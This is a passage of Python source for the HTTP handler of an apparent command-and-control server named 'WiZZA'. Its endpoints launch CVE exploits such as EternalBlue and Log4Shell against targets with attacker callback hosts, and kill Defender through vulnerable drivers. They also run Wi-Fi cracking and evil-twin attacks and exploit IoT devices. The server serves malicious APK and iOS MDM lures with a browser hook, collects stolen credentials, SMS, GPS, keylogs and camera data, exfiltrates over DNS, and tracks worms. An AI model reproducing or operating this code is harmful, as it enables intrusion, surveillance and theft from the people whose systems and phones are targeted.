                        self.wfile.write(data)
                        self.wfile.flush()
                except Exception:
                    pass
                return
            return

        # ── SOCKS5 proxy tunnel (agent-side polling) ──────────────────────────
        if path.startswith("/proxy/"):
            if not _PROXY_OK:
                self._json({"error": "proxy_socks module not available"}); return
            parts = path.split("/")  # ['','proxy','aid','action']
            p_aid    = parts[2] if len(parts) > 2 else ""
            p_action = parts[3] if len(parts) > 3 else ""

            if p_action == "poll":
                # Agent polls: returns next pending connection task {conn_id, host, port}
                task = agent_poll_proxy(p_aid)
                self._json(task or {}); return

            if p_action == "sessions":
                self._json(list_sessions(p_aid)); return

            self._json({}); return

        # ── DNS C2 TXT records (for DoH forwarding) ───────────────────────────
        if path == "/dns":
            if not _DNS_C2_OK:
                self._json({"error": "dns_c2 module not available"}); return
            # ?name=poll.<aid>.domain&type=TXT  — poll for commands
            # ?name=<seq>-<total>-<aid>.<data>.<domain>&type=TXT  — receive exfil
            name = qs.get("name",[""])[0]
            parts = name.split(".")
            if name.startswith("poll.") and len(parts) >= 2:
                aid_short = parts[1]
                self._json({"Answer": [{"type": 16, "data": f'"{_dns_get_txt(aid_short)}"'}]})
            elif len(parts) >= 3:
                try:
                    meta = parts[0].split("-")  # seq-total-aid_short
                    seq  = int(meta[0]); total = int(meta[1])
                    aid_short = meta[2] if len(meta) > 2 else "anon"
                    chunk = parts[1]
                    result = _dns_recv_chunk(seq, total, aid_short, chunk)
                    if result:
                        log(f"[DNS-C2] exfil from {aid_short}: {result[:80]}")
                except Exception:
                    pass
                self._json({"Status": 0})
            else:
                self._json({"Status": 0})
            return

        # ── Network CVE exploits ──────────────────────────────────────────────
        if path.startswith("/exploit/net/"):
            if not _NET_CVE_OK:
                self._send("network_cve module not available"); return
            cve = path[len("/exploit/net/"):]
            target = qs.get("target", [""])[0]
            lhost  = qs.get("lhost", [""])[0]
            lport  = int(qs.get("lport", ["4444"])[0])
            extra  = {k: v[0] for k, v in qs.items() if k not in ("target","lhost","lport")}
            if cve == "scan":
                subnet = qs.get("subnet", [target])[0]
                summary, _ = _net_cve.scan_for_targets(subnet)
                self._send("\n".join(summary) or "No targets found", "text/plain"); return
            if not target:
                self._send("?target= required"); return
            result = _net_cve.run(cve, target_ip=target, lhost=lhost, lport=lport, **extra)
            log(f"[NET-CVE] {cve} -> {target}: {str(result)[:80]}")
            self._send(str(result), "text/plain"); return

        # ── Web CVE exploits ──────────────────────────────────────────────────
        if path.startswith("/exploit/web/"):
            if not _WEB_CVE_OK:
                self._send("web_cve module not available"); return
            cve = path[len("/exploit/web/"):]
            target = qs.get("target", [""])[0]
            lhost  = qs.get("lhost", [""])[0]
            lport  = int(qs.get("lport", ["4444"])[0])
            cmd    = qs.get("cmd", [None])[0]
            extra  = {k: v[0] for k, v in qs.items() if k not in ("target","lhost","lport","cmd")}
            if not target:
                self._send("?target= required"); return
            kwargs = {"lhost": lhost, "lport": lport}
            if cmd: kwargs["cmd"] = cmd
            # Map target param: web CVEs use target_url or target_email or target_ip
            if cve in ("outlookntlm", "cve202323397"):
                kwargs = {"target_email": target, "attacker_smb_ip": lhost}
            elif cve in ("bigip", "f5", "cve20221388"):
                kwargs = {"target_url": target, "cmd": cmd or "id"}
            else:
                kwargs["target_url"] = target
            kwargs.update(extra)
            result = _web_cve.run(cve, **kwargs)
            log(f"[WEB-CVE] {cve} -> {target}: {str(result)[:80]}")
            self._send(str(result), "text/plain"); return

        # ── BYOVD / Defender kill endpoints ─────────────────────────────────
        if path == "/byovd":
            action = qs.get("action", ["remove_callbacks"])[0]
            driver_path = qs.get("driver", [None])[0]
            if _BYOVD_OK:
                result = _byovd_mod.run(action, driver_path=driver_path,
                                        pid=int(qs.get("pid", [0])[0]))
                log(f"[BYOVD] {action}: {str(result)[:60]}")
                self._send(str(result), "text/plain")
            else:
                self._send("byovd module not available (Windows agent required)", "text/plain")
            return

        if path.startswith("/defender/"):
            layer = path[len("/defender/"):]
            driver_path = qs.get("driver", [None])[0]
            if _DK_OK:
                result = _dk_mod.run(layer, driver_path=driver_path)
                log(f"[DEFENDER-KILL] {layer}: {str(result)[:60]}")
                self._send(str(result), "text/plain")
            else:
                self._send("defender_kill module not available", "text/plain")
            return

        # ── Zero-click network compromise ────────────────────────────────────
        if path.startswith("/zeroclick/"):
            action = path[len("/zeroclick/"):]
            attacker_ip = qs.get("ip", [self.server.server_address[0]])[0]
            dc_ip   = qs.get("dc", [None])[0]
            domain  = qs.get("domain", [None])[0]
            user    = qs.get("user", [None])[0]
            passwd  = qs.get("pass", [None])[0]
            iface   = qs.get("iface", ["eth0"])[0]
            if _ZC_OK:
                kwargs = {"attacker_ip": attacker_ip, "iface": iface}
                if dc_ip:   kwargs["dc_ip"]   = dc_ip
                if domain:  kwargs["domain"]   = domain
                if user:    kwargs["user"]     = user
                if passwd:  kwargs["password"] = passwd
                result = _zc_mod.run(action, **kwargs)
                log(f"[ZERO-CLICK] {action}: {str(result)[:60]}")
                self._send(str(result), "text/plain")
            else:
                self._send("zero_click module not available", "text/plain")
            return

        # ── WiFi attack endpoints ─────────────────────────────────────────────
        if path.startswith("/wifi"):
            sub = path[5:].lstrip("/")  # e.g. "scan", "pmkid", "auto", etc.
            iface   = qs.get("iface",   ["wlan0"])[0]
            bssid   = qs.get("bssid",   [None])[0]
            channel = qs.get("channel", ["6"])[0]
            essid   = qs.get("ssid",    ["target"])[0]
            wl      = qs.get("wordlist", ["/usr/share/wordlists/rockyou.txt"])[0]
            dur     = int(qs.get("duration", ["15"])[0])
            if not sub or sub == "help":
                self._send(
                    "WiFi Attack Endpoints:\n"
                    "  /wifi/scan?iface=wlan0&duration=15\n"
                    "  /wifi/auto?iface=wlan0&wordlist=/path/rockyou.txt\n"
                    "  /wifi/pmkid?iface=wlan0mon&bssid=AA:BB&duration=60\n"
                    "  /wifi/handshake?iface=wlan0mon&bssid=AA:BB&channel=6&ssid=NAME\n"
                    "  /wifi/crack?cap=/tmp/file.cap&wordlist=/path/rockyou.txt&bssid=AA:BB\n"
                    "  /wifi/deauth?iface=wlan0mon&bssid=AA:BB[&client=MAC]\n"
                    "  /wifi/wep?iface=wlan0mon&bssid=AA:BB&channel=6\n"
                    "  /wifi/wps?iface=wlan0mon&bssid=AA:BB&channel=6\n"
                    "  /wifi/evil_twin?iface=wlan0&ssid=NAME&channel=6\n",
                    "text/plain"
                )
                return
            if _WIFI_OK:
                try:
                    kwargs = {"iface": iface}
                    if sub == "scan":
                        result = _wifi_mod.scan_networks(iface, duration=dur)
                        lines = [f"{n['bssid']}  ch{n['channel']}  {n['encryption']}  {n['power']}dBm  {n['essid']}"
                                 for n in result]
                        self._send("\n".join(lines) or "No networks found", "text/plain")
                    elif sub == "auto":
                        threading.Thread(
                            target=_wifi_mod.auto_attack,
                            kwargs={"iface": iface, "wordlist": wl, "duration": dur},
                            daemon=True
                        ).start()
                        self._send(f"[*] auto_attack started on {iface}", "text/plain")
                    elif sub == "pmkid":
                        threading.Thread(
                            target=_wifi_mod.pmkid_attack,
                            kwargs={"mon_iface": iface, "bssid": bssid,
                                    "duration": dur, "wordlist": wl},
                            daemon=True
                        ).start()
                        self._send(f"[*] PMKID attack started on {iface}", "text/plain")
                    elif sub == "handshake":
                        threading.Thread(
                            target=_wifi_mod.capture_handshake,
                            kwargs={"mon_iface": iface, "bssid": bssid,
                                    "channel": channel, "essid": essid},
                            daemon=True
                        ).start()
                        self._send(f"[*] Handshake capture started", "text/plain")
                    elif sub == "crack":
                        cap = qs.get("cap", [f"/tmp/wizza_hs_{(bssid or '').replace(':','')}-01.cap"])[0]
                        threading.Thread(
                            target=_wifi_mod.crack_handshake,
                            kwargs={"cap_file": cap, "wordlist": wl, "bssid": bssid},
                            daemon=True
                        ).start()
                        self._send(f"[*] Cracking {cap}", "text/plain")
                    elif sub == "deauth":
                        client = qs.get("client", [None])[0]
                        threading.Thread(
                            target=_wifi_mod.deauth,
                            kwargs={"mon_iface": iface, "bssid": bssid, "client_mac": client},
                            daemon=True
                        ).start()
                        self._send(f"[*] Deauth started → {bssid}", "text/plain")
                    elif sub == "wep":
                        threading.Thread(
                            target=_wifi_mod.wep_crack,
                            kwargs={"mon_iface": iface, "bssid": bssid, "channel": channel},
                            daemon=True
                        ).start()
                        self._send(f"[*] WEP attack started", "text/plain")
                    elif sub == "wps":
                        threading.Thread(
                            target=_wifi_mod.wps_attack,
                            kwargs={"iface": iface, "bssid": bssid, "channel": channel},
                            daemon=True
                        ).start()
                        self._send(f"[*] WPS brute-force started", "text/plain")
                    elif sub == "evil_twin":
                        ap2 = qs.get("ap_iface", [iface])[0]
                        mon2 = qs.get("mon_iface", [None])[0]
                        threading.Thread(
                            target=_wifi_mod.evil_twin,
                            kwargs={"ap_iface": ap2, "mon_iface": mon2,
                                    "ssid": essid, "channel": int(channel)},
                            daemon=True
                        ).start()
                        self._send(f"[*] Evil twin AP '{essid}' started", "text/plain")
                    else:
                        self._send(f"Unknown wifi action: {sub}", "text/plain")
                except Exception as e:
                    self._send(f"[!] WiFi error: {e}", "text/plain")
            else:
                self._send("wifi_attack module not available", "text/plain")
            return

        # ── IoT attack endpoints ──────────────────────────────────────────────
        if path.startswith("/iot"):
            sub = path[4:].lstrip("/")
            ip      = qs.get("ip",      [""])[0]
            subnet  = qs.get("subnet",  ["192.168.1.0/24"])[0]
            port    = int(qs.get("port",["0"])[0]) or None
            topic   = qs.get("topic",   ["#"])[0]
            payload = qs.get("payload", ["ON"])[0]
            dur     = int(qs.get("duration", ["30"])[0])
            cmd     = qs.get("cmd",     ["id"])[0]
            if not sub or sub == "help":
                self._send(
                    "IoT Attack Endpoints:\n"
                    "  /iot/scan?subnet=192.168.1.0/24\n"
                    "  /iot/auto?subnet=192.168.1.0/24\n"
                    "  /iot/ssdp\n"
                    "  /iot/mdns?duration=15\n"
                    "  /iot/rtsp?ip=X&port=554\n"
                    "  /iot/mqtt?ip=X          (dump all topics + inject)\n"
                    "  /iot/mqtt_inject?ip=X&topic=cmnd/dev/POWER&payload=ON\n"
                    "  /iot/modbus?ip=X\n"
                    "  /iot/coap?ip=X\n"
                    "  /iot/ros?ip=X\n"
                    "  /iot/hue?ip=X           (Philips Hue bridge)\n"
                    "  /iot/lifx               (LIFX broadcast)\n"
                    "  /iot/hikvision_rce?ip=X&cmd=id\n"
                    "  /iot/tplink_rce?ip=X\n"
                    "  /iot/tenda_rce?ip=X\n"
                    "  /iot/dahua_bypass?ip=X\n"
                    "  /iot/telnet_brute?ip=X\n"
                    "  /iot/cam_creds?ip=X\n"
                    "  /iot/upnp_map?ip=X&ext_port=8888&int_ip=Y&int_port=8888\n",
                    "text/plain"
                )
                return
            if _IOT_OK:
                try:
                    action_map = {
                        "scan":          lambda: _iot_mod.scan_subnet(subnet),
                        "ssdp":          lambda: _iot_mod.ssdp_scan(),
                        "mdns":          lambda: _iot_mod.mdns_scan(duration=dur),
                        "coap":          lambda: _iot_mod.coap_scan(ip, port=port or 5683),
                        "modbus":        lambda: _iot_mod.modbus_scan(ip, port=port or 502),
                        "ros":           lambda: _iot_mod.ros_scan(ip),
                        "ros2":          lambda: _iot_mod.ros2_scan(ip),
                        "hue":           lambda: _iot_mod.philips_hue_attack(ip),
                        "lifx":          lambda: _iot_mod.lifx_attack(),
                        "tuya":          lambda: _iot_mod.tuya_local_attack(ip, port=port or 6668),
                        "rtsp":          lambda: _iot_mod.rtsp_brute(ip, port=port or 554),
                        "onvif":         lambda: _iot_mod.onvif_probe(ip, port=port or 80),
                        "mqtt":          lambda: _iot_mod.mqtt_attack(ip, port=port or 1883),
                        "mqtt_inject":   lambda: _iot_mod.mqtt_inject(ip, port=port or 1883, topic=topic, payload=payload),
                        "mqtt_dump":     lambda: _iot_mod.mqtt_dump_topics(ip, port=port or 1883, duration=dur),
                        "cam_creds":     lambda: _iot_mod.camera_default_creds(ip, port=port or 80),
                        "telnet_brute":  lambda: _iot_mod.telnet_brute(ip, port=port or 23),
                        "hikvision_rce": lambda: _iot_mod.cve_hikvision_rce(ip, port=port or 80, cmd=cmd),
                        "tplink_rce":    lambda: _iot_mod.cve_tplink_rce(ip, port=port or 80),
                        "tenda_rce":     lambda: _iot_mod.cve_tenda_rce(ip, port=port or 80),
                        "netgear_rce":   lambda: _iot_mod.cve_netgear_rce(ip, port=port or 80),
                        "axis_rce":      lambda: _iot_mod.cve_axis_rce(ip, port=port or 80),
                        "dahua_bypass":  lambda: _iot_mod.cve_dahua_auth_bypass(ip, port=port or 37777),
                        "upnp_map":      lambda: _iot_mod.upnp_port_map(
                            ip,
                            int(qs.get("ext_port",["8888"])[0]),
                            qs.get("int_ip",["127.0.0.1"])[0],
                            int(qs.get("int_port",["8888"])[0])
                        ),
                    }
                    if sub == "auto":
                        threading.Thread(
                            target=_iot_mod.auto_attack,
                            kwargs={"subnet": subnet}, daemon=True
                        ).start()
                        self._send(f"[*] IoT auto-attack started on {subnet}", "text/plain")
                    elif sub in action_map:
                        result = action_map[sub]()
                        self._send(str(result)[:8000], "text/plain")
                    else:
                        self._send(f"Unknown IoT action: {sub}", "text/plain")
                except Exception as e:
                    self._send(f"[!] IoT error: {e}", "text/plain")
            else:
                self._send("iot_attack module not available", "text/plain")
            return

        # ── Exploit module index ──────────────────────────────────────────────
        if path == "/exploit":
            lines = ["=== WiZZA CVE Exploit Modules ===\n",
                     "Network CVEs:", "  EternalBlue  /exploit/net/eternalblue?target=IP&lhost=IP",
                     "  BlueKeep     /exploit/net/bluekeep?target=IP&lhost=IP",
                     "  SMBGhost     /exploit/net/smbghost?target=IP&lhost=IP",
                     "  PrintNightmare /exploit/net/printnightmare?target=IP&lhost=IP",
                     "  ZeroLogon    /exploit/net/zerologon?target=DC_IP&dc_name=DC&domain=DOMAIN",
                     "  Follina      /exploit/net/follina?lhost=IP",
                     "  Scan subnet  /exploit/net/scan?subnet=192.168.1.0",
                     "",
                     "Web CVEs:", "  Log4Shell    /exploit/web/log4shell?target=URL&lhost=IP",
                     "  Spring4Shell /exploit/web/spring4shell?target=URL&lhost=IP",
                     "  ProxyLogon   /exploit/web/proxylogon?target=URL&lhost=IP",
                     "  Confluence   /exploit/web/confluence?target=URL&lhost=IP",
                     "  vCenter      /exploit/web/vcenter?target=URL&lhost=IP",
                     "  Outlook NTLM /exploit/web/outlookntlm?target=EMAIL&lhost=ATTACKER_IP",
                     "  F5 BIG-IP    /exploit/web/bigip?target=URL&cmd=id",
                     ]
            self._send("\n".join(lines), "text/plain"); return

        # Agent delete
        if path=="/agent/delete":
            aid=qs.get("aid",[""])[0]
            with _lock:
                agents.pop(aid,None); agent_cmds.pop(aid,None); agent_resps.pop(aid,None)
            log(f"[DELETE] Agent {aid} removed")
            self._redir("/panel"); return

        # Clear agent output
        if path=="/agent/clear_output":
            aid=qs.get("aid",[""])[0]
            with _lock:
                if aid=="__ALL__": agent_resps.clear()
                elif aid in agent_resps: agent_resps[aid].clear()
            self._redir("/panel"); return

        # Delete loot file
        if path=="/loot/delete":
            fname=qs.get("f",[""])[0]
            if fname:
                fp=os.path.join(LOOT_DIR,os.path.basename(fname))
                try: os.remove(fp)
                except: pass
            self._redir("/panel"); return

        # Clear all loot
        if path=="/loot/clear":
            if os.path.isdir(LOOT_DIR):
                for f in os.listdir(LOOT_DIR):
                    try: os.remove(os.path.join(LOOT_DIR,f))
                    except: pass
            self._redir("/panel"); return

        # Clear credentials
        if path=="/creds/clear":
            try: open(CREDS_FILE,"w").close()
            except: pass
            self._redir("/panel"); return

        # ── Mobile endpoints ──────────────────────────────────────────
        # Serve Android APK lure page
        if path == "/m/android-lure":
            lure = os.path.join(PAYLOAD_DIR, "android_lure.html")
            op_lure = os.path.join(os.path.dirname(__file__), "..", "mobile", "lure", "android.html")
            for p2 in [lure, op_lure]:
                if os.path.exists(p2):
                    self._html(open(p2).read()); return
            self._html("<h2>Android lure not found — run: start mobile</h2>"); return

        # Serve Android APK payload
        if path == "/m/android":
            apk = os.path.join(PAYLOAD_DIR, "update.apk")
            if os.path.exists(apk):
                with open(apk,"rb") as f: data=f.read()
                self.send_response(200)
                self.send_header("Content-Type","application/vnd.android.package-archive")
                self.send_header("Content-Disposition",'attachment; filename="update.apk"')
                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                self.wfile.write(data)
            else:
                self._html("<h3>APK not built — run: start mobile → Android APK</h3>")
            return

        # Serve iOS MDM profile
        if path == "/m/ios":
            profile = os.path.join(PAYLOAD_DIR, "wizza_profile.mobileconfig")
            if os.path.exists(profile):
                with open(profile,"rb") as f: data=f.read()
                self.send_response(200)
                self.send_header("Content-Type","application/x-apple-aspen-config")
                self.send_header("Content-Disposition",'attachment; filename="profile.mobileconfig"')
                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                self.wfile.write(data)
            else:
                lure_f = os.path.join(PAYLOAD_DIR, "ios_lure.html")
                op_lure = os.path.join(os.path.dirname(__file__), "..", "mobile", "lure", "ios.html") if not os.path.exists(lure_f) else lure_f
                if os.path.exists(op_lure): self._html(open(op_lure).read())
                else: self._html("<h3>iOS MDM profile not generated — run: start mobile → iOS MDM</h3>")
            return

        # Serve iOS lure page
        if path == "/m/ios-lure":
            for p2 in [os.path.join(PAYLOAD_DIR,"ios_lure.html"),
                       os.path.join(os.path.dirname(__file__),"..","mobile","lure","ios.html")]:
                if os.path.exists(p2): self._html(open(p2).read()); return
            self._html("<h3>iOS lure not found</h3>"); return

        # Serve PAC file
        if path == "/m/proxy.pac":
            pac = os.path.join(PAYLOAD_DIR, "proxy.pac")
            if os.path.exists(pac):
                self._send(open(pac).read(), "application/x-ns-proxy-autoconfig"); return
            self._html(""); return

        # Serve browser hook JS (for MitM injection)
        if path == "/m/hook.js":
            hook = os.path.join(os.path.dirname(__file__), "..", "mobile", "browser_hook.js")
            if os.path.exists(hook):
                js = open(hook).read()
                host = self.headers.get("Host","localhost")
                js = js.replace("__C2URL__", f"https://{host}")
                self._send(js, "application/javascript"); return
            self._send("", "application/javascript"); return

        # Mobile agent poll — returns pending command
        if path == "/mobile/cmd":
            sid = qs.get("sid",[""])[0] or qs.get("aid",[""])[0]
            with _lock:
                if sid in mobile_agents:
                    mobile_agents[sid]["last_seen"] = ts()
                    cmd_entry = mobile_cmds[sid].pop(0) if mobile_cmds[sid] else {}
                    self._send(json.dumps(cmd_entry), "application/json"); return
            self._send("{}", "application/json"); return

        # Mobile panel
        if path == "/mobile":
            self._html(self._mobile_panel()); return

        self._html(self._panel())

    def do_POST(self):
        p=urlparse(self.path); qs=parse_qs(p.query)
        n=int(self.headers.get("Content-Length",0)); b=self.rfile.read(n)

        if p.path=="/agent/result":
            aid=qs.get("id",[""])[0]; cmd=unquote_plus(qs.get("cmd",[""])[0])
            out=b.decode(errors="replace")
            if aid and cmd and cmd!="PING":
                _handle_result(aid,cmd,out)
            self._send("OK"); return

        # ── CDN-disguised agent data POST (/cdn-cgi/apps/data) ──────────
        if p.path == "/cdn-cgi/apps/data":
            try:
                body_str = b.decode(errors="replace")
                # Form-encoded: d=<xor-b64>&v=<aid>
                body_qs  = parse_qs(body_str)
                aid  = unquote_plus(body_qs.get("v",[""])[0])
                enc  = unquote_plus(body_qs.get("d",[""])[0])
                raw  = _comm_dec(enc, aid) if aid else enc
                # Format: "<output>|cmd=<cmd>"
                if "|cmd=" in raw:
                    out_part, cmd_part = raw.rsplit("|cmd=", 1)
                    cmd = unquote_plus(cmd_part)
                else:
                    out_part = raw; cmd = "?"
                if aid and cmd and cmd not in ("PING",""):
                    _handle_result(aid, cmd, out_part)
                    agents.setdefault(aid,{})["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            except Exception: pass
            self._send(_comm_enc("OK", aid) if aid else "OK"); return

        # ── PTY input / kill (POST from xterm.js) ────────────────────────────
        if p.path.startswith("/pty/"):
            if _PTY_OK:
                parts = p.path.split("/")  # ['','pty','aid','action']
                pty_aid = parts[2] if len(parts) > 2 else ""
                sub = parts[3] if len(parts) > 3 else ""
                if sub == "input":
                    data_str = b.decode(errors="replace")
                    _pty.put_input(pty_aid, data_str)
                    self._send("OK"); return
                if sub == "start":
                    try: d = json.loads(b.decode(errors="replace")); shell = d.get("shell","")
                    except: shell = ""
                    msg = _pty.start_pty(pty_aid, shell or None)
                    self._send(msg); return
                if sub == "stop":
                    _pty.stop_pty(pty_aid)
                    self._send("OK"); return
                if sub == "output":
                    # Agent POSTs PTY output chunk to C2
                    chunk = b.decode(errors="replace")
                    _pty.put_output(pty_aid, chunk)
                    # Return any pending input for agent
                    inp = _pty.get_input(pty_aid)
                    self._send(inp or ""); return
            self._send("OK"); return

        # ── SOCKS5 proxy relay (agent POSTs data) ─────────────────────────────
        if p.path.startswith("/proxy/"):
            if _PROXY_OK:
                parts = p.path.split("/")
                p_aid    = parts[2] if len(parts) > 2 else ""
                p_action = parts[3] if len(parts) > 3 else ""
                conn_id  = qs.get("cid",[""])[0]
                if p_action == "connected":
                    agent_connected(p_aid, conn_id, True)
                    self._send("OK"); return
                if p_action == "data":
                    # Agent sends data received from target back to SOCKS client
                    agent_data_from(p_aid, conn_id, b)
                    # Return any data operator wants to send to target
                    to_send = agent_data_to(p_aid, conn_id)
                    if to_send:
                        self.send_response(200)
                        self.send_header("Content-Type","application/octet-stream")
                        self.send_header("Content-Length",len(to_send))
                        self._cors(); self.end_headers()
                        self.wfile.write(to_send)
                    else:
                        self._send(""); return
                    return
                if p_action == "close":
                    agent_close(p_aid, conn_id)
                    self._send("OK"); return
            self._send("OK"); return

        # ── Store DNS C2 command (operator → DNS channel) ─────────────────────
        if p.path == "/dns/cmd":
            if _DNS_C2_OK:
                try:
                    d = json.loads(b.decode(errors="replace"))
                    _dns_store_cmd(d.get("aid",""), d.get("cmd",""))
                    self._json({"ok": True})
                except Exception as e:
                    self._json({"error": str(e)})
            else:
                self._json({"error": "dns_c2 not available"})
            return

        if p.path=="/catch":
            try:
                d=json.loads(b.decode(errors="replace"))
                line=f"[{ts()}]  user={d.get('user','?')!r}  pass={d.get('pass','?')!r}  src={d.get('src','?')}\n"
                open(CREDS_FILE,"a").write(line); log(f"[CREDS] {line.strip()}")
            except: pass
            self._send("OK"); return

        # ── Mobile agent endpoints ─────────────────────────────────────
        if p.path == "/mobile/register":
            try:
                d = json.loads(b.decode(errors="replace"))
                sid = d.get("agent_id") or d.get("sid") or f"m{int(time.time())}"
                info = d.get("info", {})
                with _lock:
                    mobile_agents[sid] = {
                        "sid":       sid,
                        "ip":        self.client_address[0],
                        "os":        info.get("os","?"),
                        "platform":  info.get("platform","?"),
                        "hostname":  info.get("hostname","?"),
                        "device":    f"{info.get('device_manufacturer','')} {info.get('device_model','')}".strip(),
                        "termux":    info.get("termux", False),
                        "ua":        info.get("ua",""),
                        "first_seen":ts(), "last_seen":ts(), "type":"mobile",
                    }
                log(f"[MOBILE] {sid} | {mobile_agents[sid]['os']} | {mobile_agents[sid]['device'] or mobile_agents[sid]['hostname']} | {self.client_address[0]}")
                self._send(json.dumps({"ok": True, "sid": sid}), "application/json")
            except Exception as e:
                self._send(json.dumps({"ok": False, "err": str(e)}), "application/json")
            return

        if p.path == "/mobile/data":
            try:
                d = json.loads(b.decode(errors="replace"))
                sid     = d.get("aid") or d.get("sid","unknown")
                payload = d.get("payload", d)
                dtype   = payload.get("type","unknown") if isinstance(payload,dict) else "raw"

                # Save to mobile dir
                fname = f"{sid}_{dtype}_{int(time.time())}.json"
                fpath = os.path.join(MOBILE_DIR, fname)
                with open(fpath, "w") as f:
                    json.dump({"sid": sid, "ts": ts(), "type": dtype, "data": payload}, f, indent=2)

                # Also save media to loot
                if isinstance(payload, dict) and dtype in ("mic","camera","screenshot"):
                    raw = payload.get("data","")
                    if raw and isinstance(raw, str):
                        if raw.startswith("data:"):
                            raw = raw.split(",",1)[1]
                        try:
                            ext = {"mic":"m4a","camera":"jpg","screenshot":"jpg"}.get(dtype,"bin")
                            lf = os.path.join(LOOT_DIR, f"mobile_{sid}_{dtype}_{int(time.time())}.{ext}")
                            with open(lf,"wb") as f:
                                f.write(base64.b64decode(raw))
                            log(f"[MOBILE-LOOT] {sid} {dtype} → {lf}")
                        except Exception: pass

                # For text data, also append to mobile agent log
                if dtype in ("gps","gps_ip","contacts","sms","keylog","form","password","clipboard","shell_result","info","wifi"):
                    logf = os.path.join(MOBILE_DIR, f"{sid}.log")
                    with open(logf,"a") as f:
                        f.write(f"[{ts()}] [{dtype}] {json.dumps(payload)}\n")
                    log(f"[MOBILE-DATA] {sid} → {dtype}")

                # Catch credentials from browser hook form/password events
                if dtype in ("form","password"):
                    fields = payload.get("fields",{}) if dtype=="form" else {payload.get("field","pw"): payload.get("value","")}
                    page   = payload.get("action","") or payload.get("page","")
                    line   = f"[{ts()}]  user={fields.get('username',fields.get('email',fields.get('user','?')))!r}  pass={list(fields.values())[-1]!r}  src=mobile:{page}\n"
                    open(CREDS_FILE,"a").write(line)
                    log(f"[MOBILE-CREDS] {line.strip()}")

                with _lock:
                    if sid in mobile_agents:
                        mobile_agents[sid]["last_seen"] = ts()
                        mobile_data[sid].append({"ts":ts(),"type":dtype})

                self._send(json.dumps({"ok":True}), "application/json")
            except Exception as e:
                self._send(json.dumps({"ok":False,"err":str(e)}), "application/json")
            return

        # Send command to mobile agent (from operator)
        if p.path == "/mobile/sendcmd":
            try:
                d = json.loads(b.decode(errors="replace"))
                sid = d.get("sid","")
                cmd = d.get("cmd","")
                args = d.get("args",{})
                if sid and cmd:
                    with _lock:
                        mobile_cmds[sid].append({"cmd": cmd, "args": args})
                    log(f"[MOBILE-CMD] {sid}: {cmd}")
                self._redir("/mobile")
            except:
                self._redir("/mobile")
            return

        # Form POST from panel
        params=parse_qs(b.decode(errors="replace"))
        aid=params.get("aid",[""])[0]; cmd=params.get("cmd",[""])[0]
        if aid and cmd:
            if aid=="__ALL__":
                with _lock:
                    for a in agents: agent_cmds[a].append(cmd)
                log(f"[BROADCAST] {cmd}")
            else:
                agent_cmds[aid].append(cmd); log(f"[CMD] {aid}: {cmd}")
        self._redir("/panel")

    def _panel(self):
        sorted_aids=sorted(agents.keys(),key=lambda k:(0 if agents[k].get("type","")!="js" else 1,k))
        rows=opts=""; first=sorted_aids[0] if sorted_aids else ""
        worm_aids=[a for a in sorted_aids if a.startswith("w")]
        fw=worm_aids[0] if worm_aids else ""
        for aid in sorted_aids:
            a=agents[aid]; st=a.get("status","ONLINE"); t=a.get("type","tcp"); prv=a.get("priv","?")
            is_worm=aid.startswith("w")
            cls="worm" if is_worm else ("js" if "js" in t else ("on" if st=="ONLINE" else "off"))
            pcls="root" if prv in("ROOT","ADMIN") else ""
            so=a["os"][:50]+"…" if len(a["os"])>50 else a["os"]
            wlabel=" <span class='tag' style='color:var(--pink)'>worm</span>" if is_worm else ""
            rows+=(f"<tr data-aid='{aid}'>"
                   f"<td><span class='{cls}'>{aid}</span>{wlabel}</td>"
                   f"<td>{a['ip']}</td><td title='{a['os']}'>{so}</td>"
                   f"<td>{a['hostname']}/{a.get('user','?')}</td>"
                   f"<td class='{pcls}'>{prv}</td>"
                   f"<td class='{cls}'>{t}<span class='tag'>{st}</span></td>"
                   f"<td class='{cls}'>{a['last_seen']}</td>"
                   f"<td style='white-space:nowrap'>"
                   f"<a class='qa' href='/logs?aid={aid}'>log</a> "
                   f"<a class='qa g' href='/q?aid={aid}&cmd=RECON'>recon</a> "
                   f"<a class='qa g' href='/q?aid={aid}&cmd=SCREENSHOT'>ss</a> "
                   f"<a class='qa' href='/agent/clear_output?aid={aid}'>clr</a> "
                   f"<a class='qa r' href='/agent/delete?aid={aid}' onclick='return confirm(\"Delete {aid}?\")'>del</a>"
                   f"</td></tr>")
            opts+=f"<option value='{aid}'>{aid} ({prv}) {a['ip']} [{t}]</option>"
        opts+="<option value='__ALL__'>★ ALL AGENTS</option>"
        if not rows: rows=f"<tr><td colspan='8' style='color:var(--sub);text-align:center;padding:30px'>No agents connected yet...</td></tr>"
        worm_opts=""
        for aid in worm_aids:
            a=agents[aid]; worm_opts+=f"<option value='{aid}'>{aid} {a['ip']} [{a.get('status','?')}]</option>"
        worm_opts+="<option value='__ALL_WORMS__'>🧬 ALL WORMS</option>"
        if not worm_aids: worm_opts="<option value=''>No worms connected</option>"+worm_opts
        cr=""
        try:
            for line in open(CREDS_FILE).readlines()[-20:]:
                parts={}
                [parts.__setitem__(*(tok.split("=",1))) for tok in line.strip().split("  ") if "=" in tok]
                cr+=(f"<div class='ci'>user=<span class='cv'>{parts.get('user','?').strip(chr(39))}</span>  "
                     f"pass=<span class='cv'>{parts.get('pass','?').strip(chr(39))}</span>  "
                     f"<span class='tag'>{parts.get('src','?')}</span></div>")
        except: pass
        if not cr: cr="<p style='color:var(--sub);padding:20px'>No credentials captured yet.</p>"
        ou=""
        for aid,rs in list(agent_resps.items()):
            for r in rs[-6:]:
                img_html=""
                if r.get("type")=="image" and r.get("loot"):
                    lf=r['loot']
                    img_html=(f"<div class='rimg'><img src='/loot/dl/{lf}' loading='lazy'>"
                              f"<br><a class='qa r' style='margin-top:4px;display:inline-block' "
                              f"href='/loot/delete?f={lf}' onclick='return confirm(\"Delete image?\")'>🗑 del image</a></div>")
                ou+=(f"<div class='rb'><div class='rh'>"
                     f"<span class='ra'>[{aid}]</span><span class='rc'>{r['cmd'][:80]}</span>"
                     f"<span class='rt'>{r['ts']}</span>"
                     f"<a class='rdel' href='/agent/clear_output?aid={aid}' title='Clear output'>🗑</a>"
                     f"</div><div class='rbody'>{r['resp'][:4000]}</div>{img_html}</div>")
        if not ou: ou="<p style='color:var(--sub);padding:20px'>No output yet.</p>"
        lg=""
        if os.path.isdir(LOOT_DIR):
            for f in sorted(os.listdir(LOOT_DIR),reverse=True)[:40]:
